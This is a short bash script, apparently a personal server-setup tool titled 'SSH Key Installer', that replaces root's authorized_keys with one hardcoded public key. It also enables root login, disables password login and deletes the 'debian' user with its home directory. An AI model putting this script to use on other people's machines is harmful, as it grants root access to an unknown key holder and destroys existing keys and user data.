#!/bin/bash

# 检查是否以 root 用户运行
if [ "$(id -u)" != "0" ]; then
   echo "脚本必须以 root 用户身份运行"
   exit 1
fi

# 更新包列表并安装 curl
apt-get update -y
apt-get install curl -y

echo '============================
          SSH Key Installer
    	 V1.0 Alpha
    	Author: lmc999
============================='

# 创建 .ssh 目录并设置权限
mkdir -p /root/.ssh
chmod 700 /root/.ssh

# 添加公钥到 authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEA2VpNHNe0okp25vYFxpvLFjPZkK5l4wEXQ8XJUan7lR4kSbayWxdSeN7iJdN4tJac8RCHdZOFUZALi08r0Zlro4VQUip2PhM1SfrX84N1nJadyYzUkm74M32coTAdae+UZhr4KNgvXu3fn5TZSchYSt17P2mpWaX6nj6sFM4x7/0=" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 备份原始的 sshd_config
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# 删除包含指令
sed -i '/^\s*Include\s\+\/etc\/ssh\/sshd_config\.d\/\*\.conf/d' /etc/ssh/sshd_config

# 定义修改 sshd_config 配置的函数
set_sshd_config_option() {
    local option="$1"
    local value="$2"
    local file="/etc/ssh/sshd_config"
    if grep -q "^\s*${option}\s" "$file"; then
        sed -i "s|^\s*${option}\s\+.*|${option} ${value}|g" "$file"
    else
        echo "${option} ${value}" >> "$file"
    fi
}

# 修改 sshd_config 配置
set_sshd_config_option 'PasswordAuthentication' 'no'
set_sshd_config_option 'ChallengeResponseAuthentication' 'no'
set_sshd_config_option 'KbdInteractiveAuthentication' 'no'
set_sshd_config_option 'PubkeyAuthentication' 'yes'
set_sshd_config_option 'PermitRootLogin' 'yes'
set_sshd_config_option 'ClientAliveInterval' '120'
set_sshd_config_option 'ClientAliveCountMax' '720'

# 重启 SSH 服务
systemctl restart ssh

# 检查并删除 debian 用户
if id "debian" >/dev/null 2>&1; then
    userdel -r debian
fi

# 可选：删除脚本自身
# rm -f "$0"
